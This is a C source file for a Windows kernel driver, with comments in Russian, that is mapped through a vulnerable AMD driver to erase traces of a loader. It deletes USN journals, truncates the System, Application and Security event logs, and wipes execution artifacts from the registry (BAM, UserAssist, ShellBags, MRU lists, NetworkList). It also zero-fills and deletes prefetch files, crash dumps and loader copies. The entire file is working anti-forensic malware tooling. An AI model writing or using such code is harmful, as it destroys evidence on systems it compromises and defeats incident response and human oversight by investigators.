/*
 *  ShadowClean.sys — одноразовый Ring-0 драйвер зачистки следов лоадера.
 *
 *  Маппится через amd_driver (PdFwKrnl, KDU #44) и вызывается один раз:
 *  ShadowCleanEntry(req, 0), где req — CleanRequest в юзермод-памяти лоадера
 *  (entry выполняется в контексте процесса лоадера через NtAddAtom-хук
 *  маппера → юзермод-адрес валиден на PASSIVE_LEVEL). Пул освобождается
 *  маппером сразу после возврата — ни девайса, ни резидента, ни unload-trace.
 *
 *  Делает то, что из ядра надёжно/невидимо для юзермод-наблюдателей:
 *    1. USN journal delete (ZwFsControlFile) по обоим томам.
 *    2. Force-truncate System/Application/Security .evtx.
 *    3. Реестр: HKLM (BAM/NetworkList/AppCompat) + HKCU через \Registry\User\<sid>
 *       (UserAssist/ShellBags/MUICache/RecentDocs/JumpLists/Explorer MRU).
 *    4. Force-delete списка файлов из req.file_paths[] (prefetch .pf, crash
 *       dumps, sibling-копии лоадера) — удаление не светится как юзермод-операция.
 *
 *  Не делает (юзермод-хвост): SRUM (ESE), AmCache (RegLoadKey), превенция,
 *  self-delete, оркестрация.
 *
 *  Никаких логов на диске. Никаких глобальных хуков. Всё под __try — плохой
 *  доступ не должен ронять систему.
 */

#include <ntifs.h>   // ZwDeleteFile / ZwFsControlFile / FILE_INFORMATION_CLASS
#include <ntstrsafe.h>
#include "clean_request.h"

// FSCTL_QUERY_USN_JOURNAL / FSCTL_DELETE_USN_JOURNAL и структуры
// USN_JOURNAL_DATA_V0 / DELETE_USN_JOURNAL_DATA — из ntifs.h.

// ─────────────────────────────────────────────────────────────────────────────
// Утилиты
// ─────────────────────────────────────────────────────────────────────────────

// case-insensitive substring: содержит ли `hay` подстроку `needle` (wide).
static bool ScContainsCi(_In_reads_opt_(hayLen) const wchar_t* hay,
                         _In_ size_t hayLen,
                         _In_ const wchar_t* needle) {
    if (!hay || !needle || !hayLen) return false;
    const size_t needleLen = wcslen(needle);
    if (!needleLen || needleLen > hayLen) return false;
    for (size_t i = 0; i + needleLen <= hayLen; ++i) {
        size_t j = 0;
        for (; j < needleLen; ++j) {
            wchar_t a = hay[i + j];
            wchar_t b = needle[j];
            if (a >= L'A' && a <= L'Z') a = (wchar_t)(a - L'A' + L'a');
            if (b >= L'A' && b <= L'Z') b = (wchar_t)(b - L'A' + L'a');
            if (a != b) break;
        }
        if (j == needleLen) return true;
    }
    return false;
}

static void ScRot13W(_Inout_ wchar_t* s) {
    for (; s && *s; ++s) {
        wchar_t c = *s;
        if (c >= L'a' && c <= L'z') *s = (wchar_t)(L'a' + (c - L'a' + 13) % 26);
        else if (c >= L'A' && c <= L'Z') *s = (wchar_t)(L'A' + (c - L'A' + 13) % 26);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Реестр (ядро)
// ─────────────────────────────────────────────────────────────────────────────

static HANDLE KrOpenKey(_In_ PCWSTR path, _In_ ACCESS_MASK access) {
    UNICODE_STRING us;
    RtlInitUnicodeString(&us, path);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                               nullptr, nullptr);
    HANDLE h = nullptr;
    ZwOpenKey(&h, access, &oa);
    return h;
}

// Удаляет значения ключа, чьё имя или строковые данные содержат любой токен.
static void KrDeleteValuesMatching(_In_ HANDLE hKey,
                                   _In_reads_(tokenCount) PCWSTR const* tokens,
                                   _In_ ULONG tokenCount) {
    if (!hKey) return;
    __try {
        ULONG index = 0;
        while (true) {
            UCHAR buf[2048];
            ULONG len = 0;
            NTSTATUS st = ZwEnumerateValueKey(hKey, index, KeyValueFullInformation,
                                              buf, sizeof(buf), &len);
            if (!NT_SUCCESS(st)) break; // NO_MORE_ENTRIES / ошибка — стоп

            KEY_VALUE_FULL_INFORMATION* info = (KEY_VALUE_FULL_INFORMATION*)buf;
            // Имя значения не гарантированно NUL-терминировано — копируем.
            wchar_t vname[256];
            ULONG nameChars = info->NameLength / sizeof(wchar_t);
            if (nameChars >= RTL_NUMBER_OF(vname)) nameChars = RTL_NUMBER_OF(vname) - 1;
            RtlCopyMemory(vname, info->Name, nameChars * sizeof(wchar_t));
            vname[nameChars] = 0;

            bool match = false;
            for (ULONG t = 0; t < tokenCount && !match; ++t) {
                if (tokens[t] && tokens[t][0] &&
                    ScContainsCi(vname, nameChars, tokens[t]))
                    match = true;
            }

            // Строковые данные (REG_SZ/EXPAND_SZ) — тоже проверяем.
            if (!match && (info->Type == REG_SZ || info->Type == REG_EXPAND_SZ) &&
                info->DataLength > 0 && info->DataLength < 1024) {
                const wchar_t* data = (const wchar_t*)(buf + info->DataOffset);
                const size_t dataChars = info->DataLength / sizeof(wchar_t);
                for (ULONG t = 0; t < tokenCount && !match; ++t) {
                    if (tokens[t] && tokens[t][0] &&
                        ScContainsCi(data, dataChars, tokens[t]))
                        match = true;
                }
            }

            if (match) {
                UNICODE_STRING vn;
                RtlInitUnicodeString(&vn, vname);
                ZwDeleteValueKey(hKey, &vn);
                // После удаления индексы сдвигаются — не инкрементируем.
                continue;
            }
            ++index;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// Рекурсивно удаляет подключ по имени (сначала его подключи, потом сам).
// ZwDeleteKey работает с ХЭНДЛОМ открытого ключа: открываем подключ по имени,
// пустим его рекурсивно, затем удаляем сам ключ через его же хэндл.
static void KrDeleteKeyRecursive(_In_ HANDLE hRoot, _In_ PCWSTR subName) {
    if (!hRoot || !subName) return;
    __try {
        UNICODE_STRING us;
        RtlInitUnicodeString(&us, subName);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                   hRoot, nullptr);
        HANDLE hSub = nullptr;
        if (!NT_SUCCESS(ZwOpenKey(&hSub, KEY_ALL_ACCESS, &oa))) return;

        // Сначала удаляем все его подключи.
        while (true) {
            UCHAR buf[512];
            ULONG len = 0;
            NTSTATUS st = ZwEnumerateKey(hSub, 0, KeyBasicInformation,
                                         buf, sizeof(buf), &len);
            if (!NT_SUCCESS(st)) break;
            KEY_BASIC_INFORMATION* info = (KEY_BASIC_INFORMATION*)buf;
            wchar_t child[256];
            ULONG nameChars = info->NameLength / sizeof(wchar_t);
            if (nameChars >= RTL_NUMBER_OF(child)) nameChars = RTL_NUMBER_OF(child) - 1;
            RtlCopyMemory(child, info->Name, nameChars * sizeof(wchar_t));
            child[nameChars] = 0;
            KrDeleteKeyRecursive(hSub, child);
        }

        // Теперь ключ пуст — удаляем его самого через его же хэндл.
        ZwDeleteKey(hSub);
        ZwClose(hSub);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Файлы (ядро): overwrite-before-delete (Recovery-утилиты не восстановят
// контент), затем delete-on-close.
// ─────────────────────────────────────────────────────────────────────────────
static void KrForceDeleteFile(_In_ PCWSTR path) {
    if (!path || !path[0]) return;
    __try {
        UNICODE_STRING us;
        RtlInitUnicodeString(&us, path);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                   nullptr, nullptr);
        IO_STATUS_BLOCK iosb{};
        HANDLE h = nullptr;
        // Открываем с запись+delete и максимальным шарингом.
        NTSTATUS st = ZwCreateFile(&h, GENERIC_WRITE | DELETE, &oa, &iosb, nullptr,
                                   FILE_ATTRIBUTE_NORMAL,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                   FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_WRITE_THROUGH,
                                   nullptr, 0);
        if (!NT_SUCCESS(st) || !h) return;

        // Затираем контент нулями (overwrite перед delete — Recovery не поднимет).
        FILE_STANDARD_INFORMATION fsi{};
        if (NT_SUCCESS(ZwQueryInformationFile(h, &iosb, &fsi, sizeof(fsi),
                                              FileStandardInformation))) {
            const LARGE_INTEGER total = fsi.EndOfFile;
            if (total.QuadPart > 0) {
                static const ULONG kChunk = 64 * 1024;
                UCHAR* zeros = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                                       kChunk, 'cneS');
                if (zeros) {
                    RtlSecureZeroMemory(zeros, kChunk);
                    LARGE_INTEGER off{};
                    while (off.QuadPart < total.QuadPart) {
                        ULONG chunk = kChunk;
                        if (total.QuadPart - off.QuadPart < (LONGLONG)kChunk)
                            chunk = (ULONG)(total.QuadPart - off.QuadPart);
                        IO_STATUS_BLOCK wiosb{};
                        ZwWriteFile(h, nullptr, nullptr, nullptr, &wiosb,
                                    zeros, chunk, &off, nullptr);
                        off.QuadPart += chunk;
                    }
                    ExFreePoolWithTag(zeros, 'cneS');
                }
            }
        }

        // Delete-on-close, затем закрыть — файл исчезает с затёртым контентом.
        FILE_DISPOSITION_INFORMATION disp{};
        disp.DeleteFile = TRUE;
        ZwSetInformationFile(h, &iosb, &disp, sizeof(disp), FileDispositionInformation);
        ZwClose(h);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ─────────────────────────────────────────────────────────────────────────────
// USN journal (ядро)
// ─────────────────────────────────────────────────────────────────────────────
static void KrDeleteUsnOnVolume(_In_ PCWSTR volumePath) {
    __try {
        UNICODE_STRING us;
        RtlInitUnicodeString(&us, volumePath);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                   nullptr, nullptr);
        IO_STATUS_BLOCK iosb{};
        HANDLE hVol = nullptr;
        NTSTATUS st = ZwCreateFile(&hVol, GENERIC_READ | GENERIC_WRITE, &oa, &iosb,
                                   nullptr, FILE_ATTRIBUTE_NORMAL,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   FILE_OPEN, 0, nullptr, 0);
        if (!NT_SUCCESS(st) || !hVol) return;

        USN_JOURNAL_DATA_V0 query{};
        IO_STATUS_BLOCK qiosb{};
        st = ZwFsControlFile(hVol, nullptr, nullptr, nullptr, &qiosb,
                             FSCTL_QUERY_USN_JOURNAL, nullptr, 0,
                             &query, sizeof(query));
        if (NT_SUCCESS(st)) {
            DELETE_USN_JOURNAL_DATA del{};
            del.UsnJournalID = query.UsnJournalID;
            del.DeleteFlags = 0;
            IO_STATUS_BLOCK diosb{};
            ZwFsControlFile(hVol, nullptr, nullptr, nullptr, &diosb,
                            FSCTL_DELETE_USN_JOURNAL, &del, sizeof(del),
                            nullptr, 0);
        }
        ZwClose(hVol);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Event logs: force-truncate .evtx
// ─────────────────────────────────────────────────────────────────────────────
static void KrTruncateEvtx(_In_ PCWSTR path) {
    __try {
        UNICODE_STRING us;
        RtlInitUnicodeString(&us, path);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                   nullptr, nullptr);
        IO_STATUS_BLOCK iosb{};
        HANDLE h = nullptr;
        // Максимальный шаринг — eventlog service держит файл открытым.
        NTSTATUS st = ZwCreateFile(&h, GENERIC_WRITE, &oa, &iosb, nullptr,
                                   FILE_ATTRIBUTE_NORMAL,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                   FILE_OPEN, FILE_WRITE_THROUGH, nullptr, 0);
        if (!NT_SUCCESS(st) || !h) return;
        // Обнуляем и обрезаем до нуля — лог пуст/битый, сервис пересоздаст.
        FILE_END_OF_FILE_INFORMATION eof{};
        ZwSetInformationFile(h, &iosb, &eof, sizeof(eof), FileEndOfFileInformation);
        ZwClose(h);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Реестр: целевые ключи
// ─────────────────────────────────────────────────────────────────────────────

// Удалить значения в HKLM-ключе, совпадающие с токенами.
static void KrWipeHklmValues(_In_ PCWSTR path,
                             _In_reads_(n) PCWSTR const* tokens, _In_ ULONG n) {
    HANDLE h = KrOpenKey(path, KEY_READ | KEY_WRITE);
    if (!h) return;
    KrDeleteValuesMatching(h, tokens, n);
    ZwClose(h);
}

// Удалить значения в HKCU-ключе (через \Registry\User\<sid>\...).
static void KrWipeHkcuValues(_In_ PCWSTR userSid, _In_ PCWSTR subPath,
                             _In_reads_(n) PCWSTR const* tokens, _In_ ULONG n) {
    if (!userSid || !userSid[0]) return;
    wchar_t full[512];
    RtlStringCchPrintfW(full, RTL_NUMBER_OF(full), L"\\Registry\\User\\%s\\%s",
                        userSid, subPath);
    HANDLE h = KrOpenKey(full, KEY_READ | KEY_WRITE);
    if (!h) return;
    KrDeleteValuesMatching(h, tokens, n);
    ZwClose(h);
}

// То же + один уровень подключей (для RecentDocs: per-extension подключи
// вида RecentDocs\.exe тоже несут нашу запись).
static void KrWipeHkcuValuesAndSubkeys(_In_ PCWSTR userSid, _In_ PCWSTR subPath,
                                       _In_reads_(n) PCWSTR const* tokens, _In_ ULONG n) {
    if (!userSid || !userSid[0]) return;
    wchar_t full[512];
    RtlStringCchPrintfW(full, RTL_NUMBER_OF(full), L"\\Registry\\User\\%s\\%s",
                        userSid, subPath);
    HANDLE h = KrOpenKey(full, KEY_READ | KEY_WRITE);
    if (!h) return;
    KrDeleteValuesMatching(h, tokens, n);

    // Один уровень подключей.
    __try {
        ULONG index = 0;
        while (true) {
            UCHAR buf[512];
            ULONG len = 0;
            NTSTATUS st = ZwEnumerateKey(h, index, KeyBasicInformation,
                                         buf, sizeof(buf), &len);
            if (!NT_SUCCESS(st)) break;
            KEY_BASIC_INFORMATION* info = (KEY_BASIC_INFORMATION*)buf;
            wchar_t kname[256];
            ULONG nc = info->NameLength / sizeof(wchar_t);
            if (nc >= RTL_NUMBER_OF(kname)) nc = RTL_NUMBER_OF(kname) - 1;
            RtlCopyMemory(kname, info->Name, nc * sizeof(wchar_t));
            kname[nc] = 0;

            wchar_t sub[600];
            RtlStringCchPrintfW(sub, RTL_NUMBER_OF(sub), L"%s\\%s", full, kname);
            HANDLE hSub = KrOpenKey(sub, KEY_READ | KEY_WRITE);
            if (hSub) {
                KrDeleteValuesMatching(hSub, tokens, n);
                ZwClose(hSub);
            }
            ++index;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    ZwClose(h);
}

// NetworkList: удалить подключи Signatures\{Un,}Managed, чей DnsSuffix совпадает
// с нашим доменом.
static void KrWipeNetworkList(_In_ PCWSTR domainToken) {
    if (!domainToken || !domainToken[0]) return;
    static const wchar_t* roots[] = {
        L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged",
        L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Managed",
    };
    for (int r = 0; r < 2; ++r) {
        HANDLE hBase = KrOpenKey(roots[r], KEY_READ | KEY_WRITE);
        if (!hBase) continue;
        __try {
            ULONG index = 0;
            while (true) {
                UCHAR buf[512];
                ULONG len = 0;
                NTSTATUS st = ZwEnumerateKey(hBase, index, KeyBasicInformation,
                                             buf, sizeof(buf), &len);
                if (!NT_SUCCESS(st)) break;
                KEY_BASIC_INFORMATION* info = (KEY_BASIC_INFORMATION*)buf;
                wchar_t kname[256];
                ULONG nc = info->NameLength / sizeof(wchar_t);
                if (nc >= RTL_NUMBER_OF(kname)) nc = RTL_NUMBER_OF(kname) - 1;
                RtlCopyMemory(kname, info->Name, nc * sizeof(wchar_t));
                kname[nc] = 0;

                // Читаем DnsSuffix подключа.
                wchar_t sub[600];
                RtlStringCchPrintfW(sub, RTL_NUMBER_OF(sub), L"%s\\%s", roots[r], kname);
                HANDLE hSub = KrOpenKey(sub, KEY_READ);
                bool match = false;
                if (hSub) {
                    UCHAR vbuf[1024];
                    ULONG vlen = 0;
                    UNICODE_STRING vn;
                    RtlInitUnicodeString(&vn, L"DnsSuffix");
                    st = ZwQueryValueKey(hSub, &vn, KeyValueFullInformation,
                                         vbuf, sizeof(vbuf), &vlen);
                    if (NT_SUCCESS(st)) {
                        KEY_VALUE_FULL_INFORMATION* vi = (KEY_VALUE_FULL_INFORMATION*)vbuf;
                        if (vi->DataLength > 0) {
                            const wchar_t* data = (const wchar_t*)(vbuf + vi->DataOffset);
                            if (ScContainsCi(data, vi->DataLength / sizeof(wchar_t), domainToken))
                                match = true;
                        }
                    }
                    ZwClose(hSub);
                }
                if (match) {
                    // Удаляем подключ целиком (рекурсивно).
                    KrDeleteKeyRecursive(hBase, kname);
                    // После удаления индексы сдвигаются — не инкрементируем.
                    continue;
                }
                ++index;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {}
        ZwClose(hBase);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry
// ─────────────────────────────────────────────────────────────────────────────

static void ScDoRegistry(_In_ const CleanRequest* req) {
    // Токены для совпадения: имя exe, его base, носитель, наш домен.
    PCWSTR tokens[4];
    tokens[0] = req->loader_base;
    tokens[1] = req->loader_base; // exe name with ext добавим ниже при необходимости
    tokens[2] = L"kdmapper";
    tokens[3] = L"pdfwkrnl";
    // Для UserAssist значения rot13'нуты — готовим rot13 от base.
    wchar_t rot[64];
    RtlStringCchCopyW(rot, RTL_NUMBER_OF(rot), req->loader_base);
    ScRot13W(rot);

    // BAM: HKLM\...\bam\State\UserSettings\<sid> — значения названы полным путём exe.
    {
        wchar_t bam[256];
        RtlStringCchPrintfW(bam, RTL_NUMBER_OF(bam),
            L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\%s",
            req->user_sid);
        HANDLE h = KrOpenKey(bam, KEY_READ | KEY_WRITE);
        if (h) {
            PCWSTR bt[2] = { req->loader_base, L"pdfwkrnl" };
            KrDeleteValuesMatching(h, bt, 2);
            ZwClose(h);
        }
    }

    // UserAssist (HKCU, ROT13).
    {
        static const wchar_t* uaKeys[] = {
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count",
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count",
        };
        PCWSTR rotTokens[1] = { rot };
        for (int i = 0; i < 2; ++i)
            KrWipeHkcuValues(req->user_sid, uaKeys[i], rotTokens, 1);
    }

    // MUICache (HKCU).
    {
        PCWSTR t[2] = { req->loader_base, L"pdfwkrnl" };
        KrWipeHkcuValues(req->user_sid,
            L"Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache",
            t, 2);
    }

    // RecentDocs (HKCU) — включая per-extension подключи (RecentDocs\.exe).
    {
        PCWSTR t[2] = { req->loader_base, L"pdfwkrnl" };
        KrWipeHkcuValuesAndSubkeys(req->user_sid,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
            t, 2);
    }

    // AppCompatFlags (HKLM + HKCU): Compatibility Assistant Store/Persisted, Layers.
    {
        static const wchar_t* ck[] = {
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted",
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
        };
        PCWSTR t[2] = { req->loader_base, L"pdfwkrnl" };
        for (int i = 0; i < 3; ++i) {
            wchar_t m[300];
            RtlStringCchPrintfW(m, RTL_NUMBER_OF(m), L"\\Registry\\Machine\\%s", ck[i]);
            KrWipeHklmValues(m, t, 2);
            KrWipeHkcuValues(req->user_sid, ck[i], t, 2);
        }
    }

    // Explorer MRU (HKCU).
    {
        static const wchar_t* mru[] = {
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths",
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlCache",
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery",
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU",
        };
        PCWSTR t[2] = { req->loader_base, L"pdfwkrnl" };
        for (int i = 0; i < 5; ++i)
            KrWipeHkcuValues(req->user_sid, mru[i], t, 2);
    }

    // NetworkList (HKLM) — по DnsSuffix нашего домена.
    KrWipeNetworkList(req->dns_domain);

    // ShellBags (HKCU): BagMRU — значения-блобы, содержащие имя exe (ASCII в блобе).
    // Делаем поверхностно: значения BagMRU, чьи бинарные данные содержат base.
    {
        wchar_t bags[256];
        RtlStringCchPrintfW(bags, RTL_NUMBER_OF(bags),
            L"\\Registry\\User\\%s\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU",
            req->user_sid);
        HANDLE h = KrOpenKey(bags, KEY_READ | KEY_WRITE);
        if (h) {
            __try {
                ULONG index = 0;
                while (true) {
                    UCHAR buf[8192];
                    ULONG len = 0;
                    NTSTATUS st = ZwEnumerateValueKey(h, index, KeyValueFullInformation,
                                                      buf, sizeof(buf), &len);
                    if (!NT_SUCCESS(st)) break;
                    KEY_VALUE_FULL_INFORMATION* info = (KEY_VALUE_FULL_INFORMATION*)buf;
                    bool match = false;
                    if (info->Type == REG_BINARY && info->DataLength > 0) {
                        const UCHAR* data = (const UCHAR*)(buf + info->DataOffset);
                        // ASCII-подстрока base в блобе.
                        char needleA[64];
                        size_t nb = 0;
                        for (; req->loader_base[nb] && nb < 63; ++nb)
                            needleA[nb] = (char)req->loader_base[nb];
                        needleA[nb] = 0;
                        const size_t nl = nb;
                        if (nl) {
                            for (ULONG i = 0; i + nl <= info->DataLength && !match; ++i) {
                                size_t j = 0;
                                for (; j < nl; ++j) {
                                    char a = (char)data[i + j];
                                    char b = needleA[j];
                                    if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
                                    if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
                                    if (a != b) break;
                                }
                                if (j == nl) match = true;
                            }
                        }
                    }
                    if (match) {
                        wchar_t vname[64];
                        ULONG nch = info->NameLength / sizeof(wchar_t);
                        if (nch >= RTL_NUMBER_OF(vname)) nch = RTL_NUMBER_OF(vname) - 1;
                        RtlCopyMemory(vname, info->Name, nch * sizeof(wchar_t));
                        vname[nch] = 0;
                        UNICODE_STRING vn;
                        RtlInitUnicodeString(&vn, vname);
                        ZwDeleteValueKey(h, &vn);
                        continue;
                    }
                    ++index;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}
            ZwClose(h);
        }
    }
}

static void ScDoEventLogs() {
    static const wchar_t* logs[] = {
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
    };
    for (int i = 0; i < 3; ++i)
        KrTruncateEvtx(logs[i]);
}

static void ScDoUsn(_In_ const CleanRequest* req) {
    wchar_t vol[16];
    if (req->system_volume[0]) {
        RtlStringCchPrintfW(vol, RTL_NUMBER_OF(vol), L"\\??\\%s", req->system_volume);
        KrDeleteUsnOnVolume(vol);
    }
    if (req->loader_volume[0] &&
        wcscmp(req->loader_volume, req->system_volume) != 0) {
        RtlStringCchPrintfW(vol, RTL_NUMBER_OF(vol), L"\\??\\%s", req->loader_volume);
        KrDeleteUsnOnVolume(vol);
    }
}

static void ScDoFiles(_In_ const CleanRequest* req) {
    const ULONG n = req->file_count;
    if (n > SC_MAX_FILES) return;
    for (ULONG i = 0; i < n; ++i) {
        // Никогда не трогаем запущенный образ — его сносит юзермод self-delete.
        if (req->loader_path[0] &&
            ScContainsCi(req->file_paths[i], (ULONG)wcslen(req->file_paths[i]),
                         req->loader_path))
            continue;
        KrForceDeleteFile(req->file_paths[i]);
    }
}

extern "C" NTSTATUS ShadowCleanEntry(_In_ CleanRequest* reqUser,
                                     _In_ ULONG64 reserved) {
    UNREFERENCED_PARAMETER(reserved);

    // Копируем запрос из юзермод-памяти лоадера в ядерный буфер.
    CleanRequest req{};
    __try {
        ProbeForRead(reqUser, sizeof(CleanRequest), sizeof(wchar_t));
        RtlCopyMemory(&req, reqUser, sizeof(CleanRequest));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_ACCESS_VIOLATION;
    }
    if (req.magic != SHADOW_CLEAN_MAGIC)
        return STATUS_INVALID_PARAMETER;

    // Порядок важен: USN journal — ПОСЛЕДНИМ, чтобы наши собственные
    // файловые/реестровые операции не остались в журнале (после удаления
    // журнала новые записи не пишутся до его пересоздания).
    if (req.flags & SC_DO_REGISTRY) ScDoRegistry(&req);
    if (req.flags & SC_DO_FILES)    ScDoFiles(&req);
    if (req.flags & SC_DO_EVENTLOG) ScDoEventLogs();
    if (req.flags & SC_DO_USN)      ScDoUsn(&req);

    return STATUS_SUCCESS;
}
